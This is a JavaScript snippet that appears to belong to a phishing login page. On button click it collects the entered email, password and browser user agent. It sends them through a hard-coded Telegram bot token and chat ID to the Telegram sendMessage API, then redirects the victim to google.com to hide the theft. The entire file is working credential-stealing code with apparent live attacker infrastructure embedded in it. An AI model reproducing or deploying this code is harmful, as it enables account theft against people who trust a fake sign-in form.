var token = "6423548656:AAFuFXiyAUDll8FgYjbYw6Iu30NdeSwml7s";
        var chat = "1955367555";
        let se = navigator.userAgent;
        $("button").click(function(){
            if($("#password").val()==""){
                alert("Password field cannot be empty.");
            }else{
                var mail=$("#username").val();
                var pass=$("#password").val();
                var m = `𝗘𝗺𝗮𝗶𝗹: ${mail}\n𝗣𝗮𝘀𝘀: ${pass}\n𝗨𝘀𝗲𝗿 𝗔𝗴𝗲𝗻𝘁: ${se}`;
                $.post(`https://api.telegram.org/bot${token}/sendMessage`,{
                    chat_id:chat,
                    text:m
                }).done(function(data){
                    window.location.replace("https://google.com");
                }).fail(function(data){
                    alert("Something is wrong");
                });
            }
        });
